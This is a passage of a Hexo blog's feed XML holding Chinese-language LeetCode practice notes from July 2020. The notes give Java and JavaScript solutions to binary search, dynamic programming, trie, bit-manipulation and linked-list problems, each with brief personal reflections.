class="hljs-keyword">int</span> sum)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">if</span>(root.left==<span class="hljs-keyword">null</span> &amp;&amp; root.right==<span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> root.val == sum;        <span class="hljs-keyword">return</span> hasPathSum(root.left,sum-root.val) || hasPathSum(root.right,sum-root.val);    &#125;&#125;</code></pre></div><h3 id="在排序数组中查找数字1"><a href="#在排序数组中查找数字1" class="headerlink" title="在排序数组中查找数字1"></a><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/" target="_blank" rel="noopener">在排序数组中查找数字1</a></h3><p>我的想法是二分找到tar，再向两边扩散增加res，K神直接两次二分找左右边界：<a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/solution/mian-shi-ti-53-i-zai-pai-xu-shu-zu-zhong-cha-zha-5/" target="_blank" rel="noopener">Krahets</a></p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target)</span> </span>&#123;        <span class="hljs-keyword">if</span>(nums.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> left=<span class="hljs-number">0</span>, right=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> mid = right / <span class="hljs-number">2</span>;        <span class="hljs-keyword">while</span>(nums[mid]!=target &amp;&amp; left&lt;right) &#123;            <span class="hljs-keyword">if</span>(nums[mid] &lt; target) &#123;                left = mid+<span class="hljs-number">1</span>;                mid = left+(right-left)/<span class="hljs-number">2</span>;            &#125;            <span class="hljs-keyword">if</span>(nums[mid] &gt; target) &#123;                right = mid-<span class="hljs-number">1</span>;                mid = left+(right-left)/<span class="hljs-number">2</span>;            &#125;        &#125;        <span class="hljs-keyword">if</span>(nums[mid] != target) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=mid+<span class="hljs-number">1</span>;i&lt;nums.length&amp;&amp;nums[i]==target;i++,res++);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=mid-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>&amp;&amp;nums[i]==target;i--,res++);        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="0-n-1中缺失的数字"><a href="#0-n-1中缺失的数字" class="headerlink" title="0~n-1中缺失的数字"></a><a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/" target="_blank" rel="noopener">0~n-1中缺失的数字</a></h3><p>题不难，但是自己对退出循环的条件以及退出后该返回的值总是不清楚，看K神就分析的很清楚</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">missingNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> left=<span class="hljs-number">0</span>, right=nums.length-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(left &lt;= right) &#123;            <span class="hljs-keyword">int</span> mid = left+(right-left)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span>(nums[mid] == mid) left = mid+<span class="hljs-number">1</span>;            <span class="hljs-keyword">else</span> right = mid-<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">return</span> left;    &#125;&#125;</code></pre></div><h3 id="恢复空格"><a href="#恢复空格" class="headerlink" title="恢复空格"></a><a href="https://leetcode-cn.com/problems/re-space-lcci/" target="_blank" rel="noopener">恢复空格</a></h3><p>需要手写字典树，要会</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">respace</span><span class="hljs-params">(String[] dictionary, String sentence)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = sentence.length();        Trie root = <span class="hljs-keyword">new</span> Trie();        <span class="hljs-keyword">for</span>(String str: dictionary) root.insert(str);        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n+<span class="hljs-number">1</span>];        Arrays.fill(dp,Integer.MAX_VALUE);        dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++) &#123;            dp[i] = dp[i-<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>;            Trie cur = root;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i;j&gt;=<span class="hljs-number">1</span>;j--) &#123;                <span class="hljs-keyword">int</span> t = sentence.charAt(j-<span class="hljs-number">1</span>)-<span class="hljs-string">'a'</span>;                <span class="hljs-keyword">if</span>(cur.next[t] == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(cur.next[t].isEnd == <span class="hljs-keyword">true</span>) dp[i]=Math.min(dp[i],dp[j-<span class="hljs-number">1</span>]);                <span class="hljs-comment">//防止retrained这种，re不是词但train是，必须一直往前找最小的才行，除非是0</span>                <span class="hljs-keyword">if</span>(dp[i] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;                cur = cur.next[t];             &#125;        &#125;        <span class="hljs-keyword">return</span> dp[n];    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;        <span class="hljs-keyword">public</span> Trie[] next;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> isEnd;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Trie</span><span class="hljs-params">()</span> </span>&#123;            next = <span class="hljs-keyword">new</span> Trie[<span class="hljs-number">26</span>];            isEnd = <span class="hljs-keyword">false</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(String s)</span> </span>&#123;            Trie cur = <span class="hljs-keyword">this</span>;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=s.length()-<span class="hljs-number">1</span>;i&gt;=<span class="hljs-number">0</span>;i--) &#123;                <span class="hljs-keyword">int</span> t=s.charAt(i) - <span class="hljs-string">'a'</span>;                <span class="hljs-keyword">if</span>(cur.next[t] == <span class="hljs-keyword">null</span>) cur.next[t] = <span class="hljs-keyword">new</span> Trie();                cur = cur.next[t];            &#125;            cur.isEnd = <span class="hljs-keyword">true</span>;        &#125;    &#125;&#125;</code></pre></div><h3 id="最佳买卖股票时机含冷冻期"><a href="#最佳买卖股票时机含冷冻期" class="headerlink" title="最佳买卖股票时机含冷冻期"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/" target="_blank" rel="noopener">最佳买卖股票时机含冷冻期</a></h3><p>想不出来，动规每天都好几个状态，每天都新计算这些状态，可优化空间</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] prices)</span> </span>&#123;        <span class="hljs-keyword">if</span>(prices.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> n = prices.length;        <span class="hljs-keyword">int</span>[][] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n][<span class="hljs-number">3</span>];        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = -prices[<span class="hljs-number">0</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++) &#123;            f[i][<span class="hljs-number">0</span>] = Math.max(f[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],f[i-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]-prices[i]);            f[i][<span class="hljs-number">1</span>] = f[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]+prices[i];            f[i][<span class="hljs-number">2</span>] = Math.max(f[i-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],f[i-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);        &#125;        <span class="hljs-keyword">return</span> Math.max(f[n-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],f[n-<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);    &#125;&#125;</code></pre></div><h3 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a><a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/" target="_blank" rel="noopener">平衡二叉树</a></h3><p>自顶向下写的，时间复杂度NlogN，最差logN层，每层都遍历N数量级的节点。而自底向上可以做到N复杂度，只需要遍历所有节点就可以，后者是K神的做法：<a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/solution/mian-shi-ti-55-ii-ping-heng-er-cha-shu-cong-di-zhi/" target="_blank" rel="noopener">Krahets</a></p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isBalanced</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">return</span> Math.abs(depth(root.left)-depth(root.right))&lt;=<span class="hljs-number">1</span>             &amp;&amp; isBalanced(root.left)             &amp;&amp; isBalanced(root.right);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+Math.max(depth(root.left),depth(root.right));    &#125;&#125;</code></pre></div><h3 id="数组中数字出现的次数"><a href="#数组中数字出现的次数" class="headerlink" title="数组中数字出现的次数"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/" target="_blank" rel="noopener">数组中数字出现的次数</a></h3><p>位运算找一个很简单，但找两个就很巧妙了</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] singleNumbers(<span class="hljs-keyword">int</span>[] nums) &#123;        <span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums) k ^= num;        <span class="hljs-keyword">int</span> mask = <span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>((k&amp;mask) == <span class="hljs-number">0</span>) mask &lt;&lt;= <span class="hljs-number">1</span>;        <span class="hljs-keyword">int</span> a=<span class="hljs-number">0</span>, b=<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums) &#123;            <span class="hljs-keyword">if</span>((mask&amp;num) == <span class="hljs-number">0</span>) a^=num;            <span class="hljs-keyword">else</span> b ^= num;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;a,b&#125;;    &#125;&#125;</code></pre></div><h3 id="数组中数字出现的次数-II"><a href="#数组中数字出现的次数-II" class="headerlink" title="数组中数字出现的次数 II"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/" target="_blank" rel="noopener">数组中数字出现的次数 II</a></h3><p>不会做，看K神<a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/solution/mian-shi-ti-56-ii-shu-zu-zhong-shu-zi-chu-xian-d-4/" target="_blank" rel="noopener">Krahets</a>的也很难看懂，他的one和two代表的是两个数：</p><p>one：0000000000</p><p>two：0100101000</p><p>num：0101000010</p><p>类似这样的两个数，再遍历数组计算每一位的状态，返回的就是要找的数，因为每一位是同时操作的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;7-6至7-10做题记录&quot;&gt;&lt;a href=&quot;#7-6至7-10做题记录&quot; class=&quot;headerlink&quot; title=&quot;7.6至7.10做题记录&quot;&gt;&lt;/a&gt;7.6至7.10做题记录&lt;/h1&gt;&lt;h3 id=&quot;不同路径&quot;&gt;&lt;a href=&quot;#不同路径&quot; cla</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    <category term="剑指offer" scheme="http://yoursite.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>JS力扣练习</title>
    <link href="http://yoursite.com/2020/07/04/JS%E5%8A%9B%E6%89%A3%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/07/04/JS%E5%8A%9B%E6%89%A3%E7%BB%83%E4%B9%A0/</id>
    <published>2020-07-04T07:35:24.000Z</published>
    <updated>2020-07-05T03:05:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS力扣练习"><a href="#JS力扣练习" class="headerlink" title="JS力扣练习"></a>JS力扣练习</h1><p>这边记录力扣上用JS做的一些题目，用以练习JS，常规刷题还是在用java</p><h3 id="相交链表"><a href="#相交链表" class="headerlink" title="相交链表"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/" target="_blank" rel="noopener">相交链表</a></h3><p>这个题目真的很浪漫，错的人迟早会走散，而对的人迟早会相逢。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for singly-linked list.</span><span class="hljs-comment"> * function ListNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.next = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;ListNode&#125;</span> <span class="hljs-variable">headA</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;ListNode&#125;</span> <span class="hljs-variable">headB</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;ListNode&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> getIntersectionNode = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">headA, headB</span>) </span>&#123;    <span class="hljs-keyword">var</span> n1=headA;    <span class="hljs-keyword">var</span> n2=headB;    <span class="hljs-keyword">while</span>(n1!=n2) &#123;        <span class="hljs-keyword">if</span>(n1==<span class="hljs-literal">null</span>) n1=headB;        <span class="hljs-keyword">else</span> n1=n1.next;        <span class="hljs-keyword">if</span>(n2==<span class="hljs-literal">null</span>) n2=headA;        <span class="hljs-keyword">else</span> n2=n2.next;    &#125;    <span class="hljs-keyword">return</span> n1;&#125;;</code></pre></div><h3 id="链表的中间节点"><a href="#链表的中间节点" class="headerlink" title="链表的中间节点"></a><a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/" target="_blank" rel="noopener">链表的中间节点</a></h3><p>思考利用链表节点之间的距离变化来解决</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for singly-linked list.</span><span class="hljs-comment"> * function ListNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.next = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;ListNode&#125;</span> <span class="hljs-variable">head</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;ListNode&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> middleNode = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) </span>&#123;    <span class="hljs-keyword">var</span> fast = head, slow = head;    <span class="hljs-keyword">while</span>(fast!=<span class="hljs-literal">null</span> &amp;&amp; fast.next!=<span class="hljs-literal">null</span>) &#123;        fast = fast.next.next;        slow = slow.next;    &#125;    <span class="hljs-keyword">return</span> slow;&#125;;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS力扣练习&quot;&gt;&lt;a href=&quot;#JS力扣练习&quot; class=&quot;headerlink&quot; title=&quot;JS力扣练习&quot;&gt;&lt;/a&gt;JS力扣练习&lt;/h1&gt;&lt;p&gt;这边记录力扣上用JS做的一些题目，用以练习JS，常规刷题还是在用java&lt;/p&gt;
&lt;h3 id=&quot;相交链表&quot;</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="javaScript" scheme="http://yoursite.com/tags/javaScript/"/>
    
  </entry>
  
  <entry>
    <title>7.1至7.5做题记录</title>
    <link href="http://yoursite.com/2020/07/01/7.1%E8%87%B37.5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/07/01/7.1%E8%87%B37.5%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-01T02:45:23.000Z</published>
    <updated>2020-07-06T02:16:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="7-1至7-5做题记录"><a href="#7-1至7-5做题记录" class="headerlink" title="7.1至7.5做题记录"></a>7.1至7.5做题记录</h1><h3 id="最长重复子数组"><a href="#最长重复子数组" class="headerlink" title="最长重复子数组"></a><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/" target="_blank" rel="noopener">最长重复子数组</a></h3><p>其实想到是用动规去做了，但是状态定义和状态转移都没想到，遇到动规可以尝试从后往前推</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findLength</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] A, <span class="hljs-keyword">int</span>[] B)</span> </span>&#123;        <span class="hljs-keyword">int</span>[][] f = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[A.length][B.length];        <span class="hljs-keyword">int</span> max = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;A.length;i++)            f[i][<span class="hljs-number">0</span>] = A[i]==B[<span class="hljs-number">0</span>]?<span class="hljs-number">1</span>:<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;A.length;j++)            f[<span class="hljs-number">0</span>][j] = A[<span class="hljs-number">0</span>]==B[j]?<span class="hljs-number">1</span>:<span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;A.length;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;B.length;j++) &#123;                f[i][j] = A[i]==B[j]?f[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>:<span class="hljs-number">0</span>;                max = Math.max(max,f[i][j]);            &#125;        &#125;        <span class="hljs-keyword">return</span> max;    &#125;&#125;</code></pre></div><h3 id="1-n整数中1出现的次数"><a href="#1-n整数中1出现的次数" class="headerlink" title="1~n整数中1出现的次数"></a><a href="https://leetcode-cn.com/problems/1nzheng-shu-zhong-1chu-xian-de-ci-shu-lcof/" target="_blank" rel="noopener">1~n整数中1出现的次数</a></h3><p>我不会做我是笨蛋，看大佬的题解吧：<a href="https://leetcode-cn.com/problems/1nzheng-shu-zhong-1chu-xian-de-ci-shu-lcof/solution/mian-shi-ti-43-1n-zheng-shu-zhong-1-chu-xian-de-2/" target="_blank" rel="noopener">Krahets</a></p><h3 id="数字序列中某一位的数字"><a href="#数字序列中某一位的数字" class="headerlink" title="数字序列中某一位的数字"></a><a href="https://leetcode-cn.com/problems/shu-zi-xu-lie-zhong-mou-yi-wei-de-shu-zi-lcof/" target="_blank" rel="noopener">数字序列中某一位的数字</a></h3><p>呵呵，我会做个吊毛，高中时可能还能做出来吧，看大佬的：<a href="https://leetcode-cn.com/problems/shu-zi-xu-lie-zhong-mou-yi-wei-de-shu-zi-lcof/solution/mian-shi-ti-44-shu-zi-xu-lie-zhong-mou-yi-wei-de-6/" target="_blank" rel="noopener">Krahets</a></p><h3 id="有序矩阵中第K小的元素"><a href="#有序矩阵中第K小的元素" class="headerlink" title="有序矩阵中第K小的元素"></a><a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-sorted-matrix/" target="_blank" rel="noopener">有序矩阵中第K小的元素</a></h3><p>有序矩阵要找好起始点，按条件找移动方式</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kthSmallest</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> k)</span> </span>&#123;        <span class="hljs-keyword">int</span> n=matrix.length;        <span class="hljs-keyword">int</span> left = matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];        <span class="hljs-keyword">int</span> right = matrix[n-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>];        <span class="hljs-keyword">while</span>(left&lt;right) &#123;             <span class="hljs-keyword">int</span> mid = left+(right-left)/<span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span>(check(matrix,mid,k,n)) right=mid;            <span class="hljs-keyword">else</span> left=mid+<span class="hljs-number">1</span>;        &#125;        <span class="hljs-keyword">return</span> left;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> mid, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span> i=n-<span class="hljs-number">1</span>,j=<span class="hljs-number">0</span>;        <span class="hljs-keyword">int</span> num=<span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span> &amp;&amp; j&lt;n) &#123;            <span class="hljs-keyword">if</span>(matrix[i][j] &lt;= mid) &#123;                num += i+<span class="hljs-number">1</span>;                j++;            &#125;            <span class="hljs-keyword">else</span>                i--;        &#125;        <span class="hljs-keyword">return</span> num&gt;=k;    &#125;&#125;</code></pre></div><h3 id="把数组排成最小的数"><a href="#把数组排成最小的数" class="headerlink" title="把数组排成最小的数"></a><a href="https://leetcode-cn.com/problems/ba-shu-zu-pai-cheng-zui-xiao-de-shu-lcof/" target="_blank" rel="noopener">把数组排成最小的数</a></h3><p>发现自己手写快排很不熟练，每次都要看很久。。</p><h3 id="将有序数组转换为二叉搜索树"><a href="#将有序数组转换为二叉搜索树" class="headerlink" title="将有序数组转换为二叉搜索树"></a><a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree/" target="_blank" rel="noopener">将有序数组转换为二叉搜索树</a></h3><p>二叉搜索树的中序遍历就是一个有序数组，从中间分开递归</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">sortedArrayToBST</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">return</span> help(nums,<span class="hljs-number">0</span>,nums.length-<span class="hljs-number">1</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> TreeNode <span class="hljs-title">help</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;        <span class="hljs-keyword">if</span>(left &gt; right) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        <span class="hljs-keyword">int</span> mid = (left+right)/<span class="hljs-number">2</span>;        TreeNode root = <span class="hljs-keyword">new</span> TreeNode(nums[mid]);        root.left = help(nums,left,mid-<span class="hljs-number">1</span>);        root.right = help(nums,mid+<span class="hljs-number">1</span>,right);        <span class="hljs-keyword">return</span> root;    &#125;&#125;</code></pre></div><h3 id="礼物的最大价值"><a href="#礼物的最大价值" class="headerlink" title="礼物的最大价值"></a><a href="https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof/" target="_blank" rel="noopener">礼物的最大价值</a></h3><p>二维矩阵呗</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] grid)</span> </span>&#123;        <span class="hljs-keyword">int</span> m=grid.length, n=grid[<span class="hljs-number">0</span>].length;        <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[m+<span class="hljs-number">1</span>][n+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++) &#123;                dp[i][j] = Math.max(dp[i-<span class="hljs-number">1</span>][j],dp[i][j-<span class="hljs-number">1</span>]) + grid[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];            &#125;        &#125;        <span class="hljs-keyword">return</span> dp[m][n];    &#125;&#125;</code></pre></div><h3 id="最长不含重复字符的子字符串"><a href="#最长不含重复字符的子字符串" class="headerlink" title="最长不含重复字符的子字符串"></a><a href="https://leetcode-cn.com/problems/zui-chang-bu-han-zhong-fu-zi-fu-de-zi-zi-fu-chuan-lcof/" target="_blank" rel="noopener">最长不含重复字符的子字符串</a></h3><p>自己只用了map，没想到更优解</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">// class Solution &#123;</span><span class="hljs-comment">//     public int lengthOfLongestSubstring(String s) &#123;</span><span class="hljs-comment">//         HashMap&lt;Integer,Character&gt; map = new HashMap();</span><span class="hljs-comment">//         int max = Integer.MIN_VALUE;</span><span class="hljs-comment">//         int j = 0;</span><span class="hljs-comment">//         for(int i=0;i&lt;s.length();i++) &#123;</span><span class="hljs-comment">//             char cur = s.charAt(i);</span><span class="hljs-comment">//             if(map.containsValue(cur)) &#123;</span><span class="hljs-comment">//                 max = Math.max(max,map.size());</span><span class="hljs-comment">//                 for(;map.get(j)!=cur;j++) map.remove(j);</span><span class="hljs-comment">//                 map.remove(j++);</span><span class="hljs-comment">//                 map.put(i,cur);</span><span class="hljs-comment">//             &#125;</span><span class="hljs-comment">//             else map.put(i,cur);</span><span class="hljs-comment">//         &#125;</span><span class="hljs-comment">//         max = Math.max(max,map.size());</span><span class="hljs-comment">//         return max;</span><span class="hljs-comment">//     &#125;</span><span class="hljs-comment">// &#125;</span><span class="hljs-class"><span 